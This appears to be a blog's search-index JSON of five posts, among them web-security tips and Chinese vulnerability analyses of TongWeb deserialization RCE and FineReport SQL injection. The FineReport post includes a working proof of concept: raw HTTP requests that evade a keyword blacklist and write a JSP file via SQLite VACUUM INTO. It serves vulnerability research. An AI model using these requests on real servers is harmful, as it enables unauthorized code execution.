[{"title":"测试图片显示","url":"/2025/12/31/test-image/","content":"\n这是一个测试图片显示的文章。\n\n![测试图片1](/resources/13464947a8d54db7b6323cc805ecea78.png)\n\n测试完成。\n","tags":["test"],"categories":["测试"]},{"title":"加密测试文章","url":"/2025/12/30/encrypted-test-post/","content":"\n# 这是加密文章的内容\n\n恭喜你成功解密了这篇文章！\n\n## 加密功能测试\n\n这篇文章用于测试 hexo-blog-encrypt 插件的加密功能。\n\n### 功能特点\n\n1. 文章内容在未输入正确密码前不可见\n2. 密码输入界面与暗色主题风格一致\n3. 在文章列表中显示加密标识图标\n4. 支持会话级别的密码记忆\n\n### 代码示例\n\n```javascript\n// 这是一段测试代码\nfunction secretFunction() {\n  console.log('这是加密内容中的代码');\n  return 'secret';\n}\n```\n\n### 结语\n\n如果你能看到这些内容，说明加密和解密功能正常工作！\n","tags":["加密","测试"],"categories":["测试"]},{"title":"Web Security Best Practices","url":"/2025/12/27/web-security-best-practices/","content":"\nEssential security practices every web developer should follow.\n\n## Input Validation\n\nAlways validate and sanitize user input:\n\n```javascript\n// Bad - vulnerable to XSS\nfunction displayUserInput(input) {\n  document.getElementById('output').innerHTML = input;\n}\n\n// Good - sanitize input\nfunction displayUserInput(input) {\n  const sanitized = input\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n  document.getElementById('output').textContent = sanitized;\n}\n```\n\n## SQL Injection Prevention\n\nUse parameterized queries:\n\n```python\n# Bad - vulnerable to SQL injection\ndef get_user(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    return db.execute(query)\n\n# Good - use parameterized queries\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = ?\"\n    return db.execute(query, (username,))\n```\n\n## Password Security\n\nHash passwords properly:\n\n```python\nimport bcrypt\n\n# Hashing a password\ndef hash_password(password):\n    salt = bcrypt.gensalt()\n    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n    return hashed\n\n# Verifying a password\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode('utf-8'), hashed)\n```\n\n## HTTPS and Secure Headers\n\nAlways use HTTPS and set security headers:\n\n```javascript\n// Express.js example\nconst helmet = require('helmet');\napp.use(helmet());\n\n// Set custom headers\napp.use((req, res, next) => {\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  next();\n});\n```\n\n## CSRF Protection\n\nImplement CSRF tokens:\n\n```javascript\n// Generate CSRF token\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/process', csrfProtection, (req, res) => {\n  // Process form\n});\n```\n\nSecurity is not optional - make it a priority from day one!\n","tags":["Security","Best Practices","Web Development"],"categories":["Security","Web Development"]},{"title":"TongWeb ejb服务反序列化致远程代码执行漏洞分析","url":"/2025/09/30/TongWeb-ejb服务反序列化致远程代码执行漏洞分析/","content":"\n近期TongWeb发布了一个安全加固说明，提示 EJB 远程服务存在反序列化风险，作为一个很久没爆新洞的老牌中间件厂商，一下子出来个未授权RCE，肯定是要分析一波。\n\n看下官方通告，漏洞是出现在 EJB 服务的 ejbserver 接口，而不是 WEB 服务里。可能正因如此，这个漏洞才能存在如此之久，直至最近才被披露。（By the way，近期披露高危漏洞越来越多地出现在非面向用户的HTTP服务上，可能主API端点已经被挖烂了很难出成果，把视线转移到这些冷门生僻不常用的开放端口里）\n\n![da940163f79d12e3ff156ca1202e87ef.png](/resources/9732657c38e14563b6297e2f9a289d1d.png)\n\n先看下TongWeb默认开启了哪些对外端口。再信息收集一波，漏洞不是在8088就是在5100。\n\n<img src=\"/resources/9cee0e94a67a4274a6e3407eb7b5d98d.png\" alt=\"aeae98f6cb07bc2a66c7111d7835fa0b.png\" width=\"709\" height=\"228\" class=\"jop-noMdConv\">\n\n <img src=\"/resources/c319ba01c90149a6988c08daeb02957a.png\" alt=\"521c9e3a08945eaf3ede18c5cb7f276c.png\" width=\"702\" height=\"194\" class=\"jop-noMdConv\">\n\n接口差不多确定后就可以找下路由，由于官方已经发了在 ejbserver 接口下，所以关键词检索找下，最后在 catalina 里确定了路由为`/ejbserver/ejb`。确定路由接口了，再随便向8088跟5100发送些序列化数据，可以确定端口为8088。\n\n![ca9a32c8bd9b28f3da1088b983ca1407.png](/resources/90ee795ab7d54a7aaf9aae7fabb02131.png)\n\n接下来看下补丁，TongWeb官方还是比较实诚的，把漏洞所在类已经写清楚了。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<patchDescriptor>\n    <id>TW7030-TW7049M4_ITAIT-7010</id>\n    <sharedArchiveDesc>\n        <rule>\n            <name>update</name>\n            <value>com/tongweb/tongejb/server/httpd/ServerServlet.class</value>\n        </rule>\n        <src>media/lib/tongweb.jar</src>\n        <dest>lib/tongweb.jar</dest>\n    </sharedArchiveDesc>\n</patchDescriptor>\n\n```\n\n持续跟进 service 方法，最后会跟到`com.tongweb.tongejb.server.ejbd.EjbDaemon#service`下。\n\n<img src=\"/resources/0941eb8109b5453bbe97d9fe36c0bcd6.png\" alt=\"0516d7d777941cb62446b3321c4de750.png\" width=\"694\" height=\"320\" class=\"jop-noMdConv\">\n\n可以看到原始输入流经过了两次自定义的`readExternal`，第一次是对输入流的协议头有格式要求，必须匹配正则`^OEJP/[0-9].[0-9]$`，第二次则是要求输入流写入一个字节的值1。\n\n<img src=\"/resources/a103505d0a594ceb94a3b0cd366d9205.png\" alt=\"5a6b8d7aa3a680b5ea05ae7922251d25.png\" width=\"779\" height=\"127\" class=\"jop-noMdConv\"> <img src=\"/resources/4d5afdb5126f44bc9118fd1b2cdaed67.png\" alt=\"112cda267867fe74fa1a3d78f271c81f.png\" width=\"729\" height=\"200\" class=\"jop-noMdConv\">\n\n那么我们就已经确定了Tongweb的反序列化方式，那么接下来只需要找一条可调用的Gadget链子就行了。\n\n先检查下其依赖，第一眼就能看到`commons-beanutils-core-1.8.3.jar`，而且TongWeb有一个老洞就是用CB链，顺其自然用CB183打一波发现失败了，找原因发现是并没有引入`org.apache.commons.beanutils.BeanComparator`包。继续检查发现`xbean-naming-4.5.jar`，而且众所周知，TongWeb就是照着TomCat改的，那么TomCat存在的问题TongWeb也大概率存在，因此可以想到利用`BadAttributeValueExpExceptionToString->XBeanToString->TomcatElRef`\n\n找了一下果然发现TongWeb原封不动的“借鉴”了Tomcat的`BeanFactory`，只不过改了个包名`com.tongweb.naming.factory.BeanFactory`。那么就可以用别人写好的payload试着构造下。https://github.com/unam4/yso-mysqlpipe/blob/main/src/main/java/ysoserial/payloads/XbeanWithBeanFactory.java\n\n引入TongWeb的依赖，并把factory的名字改掉。\n\n<img src=\"/resources/320d5bc27a9d4cca9328d1ce4c7f2e80.png\" alt=\"939407b7ee2fb682e2309024930ac593.png\" width=\"802\" height=\"542\" class=\"jop-noMdConv\">\n\n理论上就ok了，但是结果发现还是失败。。。。百思不得其解最后才发现是表达式注入里的payload用的base64类TongWeb没有。。。换成TongWeb自己的base64类终于执行成功。\n\n<img src=\"/resources/f39d9afedc4e435f9e05e54b2f213948.png\" alt=\"61fabd59883f1e57f93abb3dfb8d00f1.png\" width=\"812\" height=\"300\" class=\"jop-noMdConv\">\n\n<img src=\"/resources/45e6353986fb47a592d91954c4e74139.png\" alt=\"5247fc077e703dfb343bc1a6b7f33c85.png\" width=\"780\" height=\"275\" class=\"jop-noMdConv\">","tags":["Java","vulnerability"],"categories":["漏洞分析"]},{"title":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞","url":"/2025/06/30/帆软FineReport-Export-excel-未授权SQL注入致远程代码执行漏洞/","content":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞\n\n官方给的接口是 export/excel，且说了问题出在 LargedsExcelExport 这个模块里，帆软v11 web 端架构并不复杂，可通过注解 `@RequestMapping` 快速锁定相关路由。用 Jadx 搜一下，发现大部分路由都位于`com.fr.nx.app.web.controller.NXController`。\n\n<img src=\"/resources/13464947a8d54db7b6323cc805ecea78.png\" alt=\"d1986651344e1a603a92f8f2e9e23c27.png\" width=\"774\" height=\"306\">\n\n跟进到`com.fr.nx.app.web.controller.NXController#largedsExcelExportV9`，重点关注初始化方法`initCreator`。\n\n![254aa8d33b3366955492da97c3569b2d.png](/resources/e0a12bf8ed824dc0ba2a1b45bd39f56c.png)\n\n首先获取一个参数`__parameters__`，这个参数不关键，默认为{}。\n\n之后会进入`getEntity`方法，该方法需要读取第二个参数`params`，然后通过`createXMLableReader`方法自定义一个xml格式数据来还原对象。\n\n<img src=\"/resources/180b13b91af64bfc898e36a8fa084513.png\" alt=\"feb5184c9bc7bbb32f4c56a958ee4be4.png\" width=\"731\" height=\"263\">\n\n仿照其构造一个，格式如下：\n\n![bbc6cf5ded3f8b6edb4ded56d0a1cf54.png](/resources/01d3b5d50727422699e76a99b85ba49e.png)\n\n回到`getEntity`方法，程序继续执行会进入`dealParam`。\n\n![10d1648b0baf4743d18336b64b699916.png](/resources/0b164bd922534eea80ecc92882c5cf6a.png)\n\n这里需要第三个参数`functionParams`，同样默认为json。这里着重注意下，传入的`LargeDatasetExcelExportJavaScript`类型变量获取了其中`<Parameters>`下的每一个`<Parameter>`，执行了`var25 = var2.evalValue(String.valueOf(var17.getValue()));`操作。\n\n这个方法不是第一次爆洞了，简单来说就是其中可以执行帆软定义的一些函数。而帆软报表默认使用Sqlite作为数据库引擎，并且默认存在数据库FRDemo，因此可以执行SQL语句。\n\n![c53fdfe0f633ce998219e4208191c8d5.png](/resources/663baf5273c3433f8630f63aadd301b7.png)\n\n在执行SQL前，会调用`JDBCSecurityChecker.checkQuery`方法对SQL进行安全检查。跟进`checkQuery`方法，该方法做了一个黑名单检测，如果匹配到`InsecurityElement`对应的关键字，则报错退出。\n\n![24914a06c571d240990bf19d4cdcc311.png](/resources/6a962ebb2b14418b95342155cac2086f.png)\n\n也就是说，现在需要绕过SQL安全检测限制并实现webshell落地，目前已知可用的SQL注入路径如下：（由于默认的数据库里数据太多写入的shell无法解析，所以我们要先清空FRDemo数据库）：\n\n```sql\nPRAGMA writable_schema=ON;\nDELETE FROM sqlite_schema WHERE name='sqlite_stat1';\nANALYZE;\nREPLACE INTO sqlite_stat1 VALUES ('', '<JSP_PAYLOAD>', '');\nVACUUM INTO (ENV_HOME/../../92ccC9AC.jsp);\n```\n\nPOC如下：\n\n```\nGET /webroot/ReportServer?viewlets=[{'reportlet':'/'}] HTTP/1.1\nHost: 10.211.55.3:8075\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nop: getSessionID\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n\n```\n\n```\nGET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/1.1\nHost: 10.211.55.3:8075\nAccept-Encoding: gzip, deflate\nAccept: */*\nsessionID: 118b5fb1-596e-45cb-93b0-692ceb30641e\nparams: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27%3C%25+out.println%28new+String%28new+sun.misc.BASE64Decoder%28%29.decodeBuffer%28%5C%22Zjc5NjUxODQ4NDAyY2JmZmI3MWNmNGMwYWYyNzU0NzE%3D%5C%22%29%29%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E%22%2C%22%27%22%2C%22%2C%27%27%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%2292ccC9AC%22%2C%22.%22%2C%22j%22%2C%22s%22%2C%22p%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E\n```\n\n![abf87ef9964f396b3ab50677399b690e.png](/resources/e8c4e39e2c6b44f2a21c70dda2db8f17.png)","tags":["Java","vulnerability"],"categories":["漏洞分析"]}]